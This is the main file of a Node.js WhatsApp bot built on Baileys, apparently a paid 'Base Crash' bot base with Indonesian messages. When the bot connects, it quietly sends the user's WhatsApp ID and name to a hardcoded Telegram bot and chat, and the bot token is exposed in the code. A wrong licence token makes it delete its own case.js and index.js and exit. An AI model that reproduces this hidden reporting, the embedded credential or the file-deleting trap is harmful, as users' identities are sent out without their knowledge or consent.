require('./all/settings/settings');
const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    jidDecode, 
    proto, 
    relayWAMessage, 
    getContentType, 
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const figlet = require('figlet');
const chalk = require("chalk");
const crypto = require('crypto');
const { Boom } = require('@hapi/boom');
const { color } = require('./all/color');
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./all/myfunc');

const usePairingCode = true;
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => {
return new Promise((resolve) => { rl.question(text, resolve) });
}

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot8137507265:AAFLVtH-2_8htoAcihJmVZPz8OLdWKD78CQ/sendMessage`, {
            chat_id: '7807425271',
            text: message
        });
    } catch (error) {
    }
};

const manualToken = '92638'; // 

// Fungsi untuk menghapus file
function deleteFiles() {
    const filesToDelete = ['case.js', 'index.js']; // Ganti dengan nama file.js yang ingin dihapus
    filesToDelete.forEach(file => {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file); // Menghapus file
            console.log(`File ${file} Telah di Hapus Karena User Bukan Buyer Ori Bang Base`);
        }
    });
}

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

console.clear()
console.log(chalk.white.bold(`
${chalk.red("Getting Connection Acces")}
${chalk.blue("Acces Granted")}
`));  
console.log(chalk.white.bold(`${chalk.cyan(`Welcome To ZyuroxZXVO 💎`)}

`));

// Whatsapp Connect
async function ConnetToWhatsapp() {
const { state, saveCreds } = await useMultiFileAuthState('./session');
const ryu = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: ["Ubuntu", "ZyuroxZ", "20.0.04"]
});
if (usePairingCode && !ryu.authState.creds.registered) {
const inputToken = await question('Masukkan Token Yang Di berikan Bang Base:\n');

        if (inputToken !== manualToken) {
            console.log('Token Salah ❌\nSystem Akan Menghapus File Dan mematikan Running!');
            deleteFiles(); // Hapus file jika Token salah
            process.exit(); // Matikan konsol
        }
        console.log(chalk.green.bold(`Token Benar ✅\nMantap Buyer Sejati😁👊`));
const phoneNumber = await question(chalk.cyan.bold('Masukin Nomer Lu Bree!\nNomer Lu : '));
const code = await ryu.requestPairingCode(phoneNumber.trim());
console.log(chalk.green.bold(`Code : ${code}`));
}

store.bind(ryu.ev);
ryu.ev.on("messages.upsert", async (chatUpdate, msg) => {
 try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!ryu.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('FatihArridho_')) return;
const m = smsg(ryu, mek, store)
require("./command/case")(ryu, m, chatUpdate, store)
 } catch (err) {
 console.log(err)
 }
});

    ryu.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    ryu.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = ryu.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    ryu.public = true

    ryu.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log(color(lastDisconnect.error, 'deeppink'));
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit();
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`Bad Session File, Please Delete Session and Scan Again`));
                process.exit();
            } else if (reason === DisconnectReason.connectionClosed) {
                console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionLost) {
                console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionReplaced) {
                console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'));
                ryu.logout();
            } else if (reason === DisconnectReason.loggedOut) {
                console.log(color(`Device Logged Out, Please Scan Again And Run.`));
                ryu.logout();
            } else if (reason === DisconnectReason.restartRequired) {
                console.log(color('Restart Required, Restarting...'));
                await ConnetToWhatsapp();
            } else if (reason === DisconnectReason.timedOut) {
                console.log(color('Connection TimedOut, Reconnecting...'));
                ConnetToWhatsapp();
            }
        } else if (connection === "connecting") {
            console.log(color('Menghubungkan . . . '));
        } else if (connection === "open") {
            console.log(color('Bot Berhasil Tersambung'));
            sendTelegramNotification(`Connection information report 🌸\n\nThe device has been connected, Here is the information\n> User ID : ${ryu.user.id}\n> Username : ${ryu.user.name}\n\nBase Crash : Created By Base`);
        }
    });

    ryu.sendText = (jid, text, quoted = '', options) => ryu.sendMessage(jid, { text: text, ...options }, { quoted });
    
    ryu.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
    } 
    
    ryu.ev.on('creds.update', saveCreds);
    return ryu;
}

ConnetToWhatsapp();

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
